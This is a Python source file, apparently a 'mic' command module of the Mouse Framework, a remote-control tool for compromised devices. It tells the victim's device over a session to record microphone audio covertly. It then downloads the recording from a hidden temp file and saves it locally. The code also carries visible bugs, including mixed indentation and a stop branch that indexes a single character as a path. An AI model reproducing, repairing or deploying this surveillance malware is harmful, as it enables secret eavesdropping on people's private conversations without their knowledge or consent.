#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.helper as h
import json
import time
import os

class command:
    def __init__(self):
        self.name = "mic"
        self.description = "Record mic sound."
        self.usage = "Usage: mic [start|stop <local_path>]"
        
    def run(self,session,cmd_data):
        if not cmd_data['args']:
            print self.usage
        else:
            if cmd_data['args'].split()[0] == "start":
                pass
            else:
                if len(cmd_data['args'].split()) < 2 or cmd_data['args'].split()[0] != "stop":
                    print self.usage
            	    return
		
        if cmd_data['args'] == "stop":
	    dest = cmd_data['args'][1]
            if os.path.isdir(dest):
                if os.path.exists(dest):
		    h.info_general("Recording mic...")
                    result = json.loads(session.send_command(cmd_data))
                    if 'error' in result:
                        h.info_error("Failed to record mic!")
			return
                    elif 'status' in result and result['status'] == 1:
                        data = session.download_file("/tmp/.avatmp")
                        f = open(os.path.join(dest,'mic.caf'),'w')
                        f.write(data)
                        f.close()
                    if dest[-1:] == "/":
                        h.info_general("Saving to "+dest+"mic.caf...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"mic.caf!")
                    else:
                        h.info_general("Saving to "+dest+"/mic.caf...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"/mic.caf!")
                else:
                    h.info_error("Local directory: "+dest+": does not exist!")
            else:
                rp = os.path.split(dest)[0]
                if os.path.exists(rp):
		    if os.path.isdir(rp):
			pr = os.path.split(dest)[0]
                        rp = os.path.split(dest)[1]
                        result = json.loads(session.send_command(cmd_data))
                        if 'error' in result:
                            h.info_error("Failed to record mic!")
			    return
                        elif 'status' in result and result['status'] == 1:
                            data = session.download_file("/tmp/.avatmp")
                            f = open(os.path.join(pr,rp),'w')
                            f.write(data)
                            f.close()
                        h.info_general("Saving to "+dest+"...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"!")
                    else:
                        h.info_error("Error: "+rp+": not a directory!")
                else:
                    h.info_error("Local directory: "+rp+": does not exist!")
        
        elif cmd_data['args'].split()[0] == "start":
            h.info_general("Recording mic...")
            h.info_general(session.send_command(cmd_data))
